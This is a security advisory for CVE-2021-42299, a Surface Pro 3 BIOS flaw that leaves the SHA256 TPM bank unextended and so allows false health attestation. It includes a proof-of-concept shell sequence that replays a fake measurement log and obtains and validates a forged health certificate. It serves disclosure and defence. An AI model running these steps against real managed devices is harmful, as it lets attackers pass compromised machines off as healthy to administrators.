---
title: 'Surface Pro 3: BIOS False Health Attestation (TPM Carte Blanche)'
severity: High
ghsa_id: GHSA-c4qg-jj77-rcc3
cve_id: CVE-2021-42299
weaknesses: []
products:
- ecosystem: n/a
  package_name: Surface Pro 3 BIOS
  affected_versions: 3.11.2550
  patched_versions: ''
cvss: null
credits:
- github_user_id: chrisfenner
  name: Chris Fenner
  avatar: https://avatars.githubusercontent.com/u/61842497?s=40&v=4
---

### Summary
On affected Surface Pro 3 BIOS versions, when both SHA1 and SHA256 PCR banks are enabled, the SHA256 bank is not extended. This allows an adversary to falsify TPM-based health attestation by extending fake measurements into the TPM and getting a valid quote over the fake measurements.

### Severity
HIGH - An adversary running on an affected BIOS can falsely attest any desired health attestation it wants, including a state corresponding to a "fixed" BIOS.

### Proof of Concept
```shell
# Extend the fake log
sudo dhatool --log=path/to/log/file --bank=sha256 replay
# Self test
sudo attest-tool --log=path/to/log/file self-test
# Get AIK cert
sudo akcli
# Fetch a health cert
sudo dhatool --log=path/to/log/file --bank=sha256 --aik=path/to/aik getcert
# Validate the health cert against DHA with the current time as a nonce
NONCE=$(echo "obase=16; $(date +%s%N)" | bc); echo ${NONCE}
# normally the MDM generates a nonce, asks the device for claims and then validates against DHA
sudo dhatool --cert-path/to/healthcert --bank=sha256 --aik=path/to/aik --nonce=$NONCE validate
```

### Further Analysis
For more information, see https://github.com/google/security-research/blob/master/pocs/bios/tpm-carte-blanche/readme.md

### Timeline
**Date reported**: To Microsoft: 2021-05-26; to AMI: 2021-05-26; to TianoCore: 2021-07-19
**Date fixed**: In TianoCore: [2021-07-29](https://edk2.groups.io/g/devel/message/78382)
**Date disclosed**: 2021-10-18